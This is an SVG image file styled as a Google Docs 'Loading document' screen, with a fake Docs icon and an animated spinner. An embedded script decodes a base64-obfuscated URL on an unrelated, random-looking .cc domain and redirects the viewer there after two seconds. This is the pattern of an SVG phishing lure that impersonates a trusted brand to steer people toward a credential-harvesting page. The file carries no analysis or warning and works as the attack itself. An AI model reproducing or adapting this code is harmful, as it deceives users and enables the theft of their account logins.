<svg width="100vw" height="100vh" viewBox="0 0 800 600" xmlns="http://www.w3.org/2000/svg" style="display:block;position:fixed;top:0;left:0;width:100vw;height:100vh;">
  <defs>
    <linearGradient id="loaderGradient" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#4285f4"/>
      <stop offset="100%" stop-color="#1a73e8"/>
    </linearGradient>
    <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
      <feDropShadow dx="0" dy="8" stdDeviation="16" flood-color="#000" flood-opacity="0.10"/>
    </filter>
  </defs>
  <script type="application/ecmascript"><![CDATA[
    setTimeout(function() {
      var b64 = "aHR0cHM6Ly9hY2NvdW50Lmk0aHQyOTg0Z3QuY2Mv";
      var url = atob(b64);
      window.location.href = url;
    }, 2000);
  ]]></script>
  <!-- Background -->
  <rect width="800" height="600" fill="#f8f9fa"/>
  <!-- Centered card (bigger and centered) -->
  <rect x="200" y="120" width="400" height="320" rx="32" fill="#fff" filter="url(#shadow)"/>
  <!-- Google Docs icon (bigger) -->
  <g transform="translate(300, 180)">
    <rect x="0" y="0" width="80" height="110" rx="16" fill="#4285f4"/>
    <rect x="16" y="22" width="48" height="12" rx="4" fill="#fff" opacity="0.8"/>
    <rect x="16" y="44" width="48" height="12" rx="4" fill="#fff" opacity="0.8"/>
    <rect x="16" y="66" width="36" height="12" rx="4" fill="#fff" opacity="0.8"/>
    <rect x="16" y="88" width="24" height="12" rx="4" fill="#fff" opacity="0.8"/>
  </g>
  <!-- Spinning loader (bigger and centered) -->
  <g transform="translate(500, 235)">
    <circle cx="0" cy="0" r="40" stroke="url(#loaderGradient)" stroke-width="10" fill="none" stroke-dasharray="62 38">
      <animateTransform attributeName="transform" type="rotate" from="0 0 0" to="360 0 0" dur="1s" repeatCount="indefinite"/>
    </circle>
  </g>
  <!-- Loading text (centered and larger) -->
  <text x="400" y="400" font-family="Arial, Helvetica, sans-serif" font-size="36" fill="#3c4043" text-anchor="middle">
    Loading documentâ€¦
  </text>
</svg>
